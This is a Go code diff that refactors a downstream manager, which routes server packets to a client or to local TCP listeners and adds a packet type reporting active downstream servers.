@@ -24,8 +24,8 @@ type DownstreamManager struct {
 	downstreamClient     DownstreamClient
 	downstreamClientInfo string
 
-	downstreamLocaltcp        DownstreamLocaltcp
-	downstreamLocaltcpChannel chan struct{} // Notify only
+	downstreamLocaltcp       DownstreamLocaltcp
+	downstreamLocaltcpNotify chan struct{}
 }
 
 func MakeDownstreamManager(upstream UpstreamHttp) DownstreamManager {
@@ -41,38 +41,46 @@ func MakeDownstreamManager(upstream UpstreamHttp) DownstreamManager {
 	downstreamLocaltcp := MakeDownstreamLocaltcp("")
 
 	downstreamManager := DownstreamManager{
-		upstream:                  upstream,
-		downstreamClient:          downstreamClient,
-		downstreamClientInfo:      downstreamClientInfo,
-		downstreamLocaltcp:        downstreamLocaltcp,
-		downstreamLocaltcpChannel: make(chan struct{}),
+		upstream:                 upstream,
+		downstreamClient:         downstreamClient,
+		downstreamClientInfo:     downstreamClientInfo,
+		downstreamLocaltcp:       downstreamLocaltcp,
+		downstreamLocaltcpNotify: make(chan struct{}),
 	}
 	return downstreamManager
 }
 
+// Do will handle an incoming packet from the server, by selecting appropriate downstream
 func (dm *DownstreamManager) Do(packet model.Packet) (model.Packet, error) {
 	if packet.DownstreamId == "manager" {
 		return dm.doManager(packet)
 	} else if packet.DownstreamId == "client" {
-		return dm.downstreamClient.do(packet)
-	} else if strings.HasPrefix(packet.DownstreamId, "net") { // net#1
-		return dm.downstreamLocaltcp.do(packet)
+		return dm.downstreamClient.Do(packet)
+	} else if strings.HasPrefix(packet.DownstreamId, "net") { // e.g. "net#1"
+		return dm.downstreamLocaltcp.Do(packet)
 	} else {
-		return dm.downstreamClient.do(packet)
+		return packet, fmt.Errorf("Unknown downstreamid: %s", packet.DownstreamId)
 	}
 }
 
+// doManager handles downstream-manager related packets (not associated with a downstream, but managing them)
 func (dm *DownstreamManager) doManager(packet model.Packet) (model.Packet, error) {
 	if packet.DownstreamId != "manager" {
 		return packet, fmt.Errorf("Wrong args")
 	}
 	if packet.PacketType == "downstreamStart" {
-		log.Info("Downstreamstart")
 		ret, err := dm.StartListeners()
 		if err != nil {
 			packet.Response["err"] = err.Error()
 		} else {
 			packet.Response["ret"] = ret
+		}
+	} else if packet.PacketType == "downstreamServers" {
+		downstreams := dm.DownstreamServers()
+		for idx, downstreamInfo := range downstreams {
+			idxStr := strconv.Itoa(idx)
+			packet.Response["name"+idxStr] = downstreamInfo.Name
+			packet.Response["info"+idxStr] = downstreamInfo.Info
 		}
 	} else {
 		packet.Response["ret"] = "packettype not known"
@@ -81,20 +89,21 @@ func (dm *DownstreamManager) doManager(packet model.Packet) (model.Packet, error
 	return packet, nil
 }
 
-// startListeners will set up all downstreams which have a listening component as threads
+// StartListeners will all downstream servers
 func (dm *DownstreamManager) StartListeners() (string, error) {
-	// Thread: new downstreams via downstreamLocaltcpChannel
-	ln, err := dm.downstreamLocaltcp.startServer()
+	log := ""
+
+	// Downstream: LocalTcp
+	err := dm.downstreamLocaltcp.StartServer()
 	if err != nil {
 		return "", err
 	}
-	go dm.downstreamLocaltcp.loop(ln, dm.downstreamLocaltcpChannel)
+	go dm.downstreamLocaltcp.ListenerLoop(dm.downstreamLocaltcpNotify) // TODO: error checking
 
-	// Thread: receive new downstreams via local tcp, lifetime: app?
-	go func() {
+	go func() { // Thread: receive new downstreams via local tcp, lifetime: app?
 		for {
 			// Wait for newly announced TCP downstreams
-			<-dm.downstreamLocaltcpChannel
+			<-dm.downstreamLocaltcpNotify
 
 			// Notify server
 			dm.SendDownstreams()
@@ -102,19 +111,21 @@ func (dm *DownstreamManager) StartListeners() (string, error) {
 			// TODO when to quit thread
 		}
 	}()
+	log += "Started LocalTcp on " + dm.downstreamLocaltcp.ListenAddr()
 
-	return "Started on ...", nil
+	return log, nil
 }
 
+// SendDownstreams is used to notify the server about newly connected downstream clients
 func (dm *DownstreamManager) SendDownstreams() {
 	// notify server of new downstream executors
-
-	downstreams := make([]DownstreamInfo, 0)
 	downstreamInfoClient := DownstreamInfo{
 		"client",
 		dm.downstreamClientInfo,
 	}
 	downstreamInfoTcp := dm.downstreamLocaltcp.DownstreamList()
+
+	downstreams := make([]DownstreamInfo, 0)
 	downstreams = append(downstreams, downstreamInfoClient)
 	downstreams = append(downstreams, downstreamInfoTcp...)
 
@@ -131,4 +142,38 @@ func (dm *DownstreamManager) SendDownstreams() {
 	if err != nil {
 		log.Errorf("Senddownstreams send error: %s", err.Error())
 	}
+}
+
+// SendDownstreamServers notifies the server about current active downstream servers
+func (dm *DownstreamManager) DownstreamServers() []DownstreamInfo {
+	downstreams := make([]DownstreamInfo, 0)
+	// notify server of new downstream executors
+	downstreamInfoClient := DownstreamInfo{
+		"client",
+		"default",
+	}
+	downstreams = append(downstreams, downstreamInfoClient)
+	if dm.downstreamLocaltcp.Started() {
+		downstreamInfoTcp := DownstreamInfo{
+			"localtcp",
+			"" + dm.downstreamLocaltcp.ListenAddr(),
+		}
+		downstreams = append(downstreams, downstreamInfoTcp)
+	}
+
+	return downstreams
+	/*
+		arguments := make(model.PacketArgument)
+		response := make(model.PacketResponse)
+		for idx, downstreamInfo := range downstreams {
+			idxStr := strconv.Itoa(idx)
+			response["name"+idxStr] = downstreamInfo.Name
+			response["info"+idxStr] = downstreamInfo.Info
+		}
+		packet := model.NewPacket("downstreamServers", "", strconv.Itoa(int(rand.Uint64())), arguments, response)
+
+		err := dm.upstream.SendOutofband(packet)
+		if err != nil {
+			log.Errorf("Senddownstreams send error: %s", err.Error())
+		}*/
 }
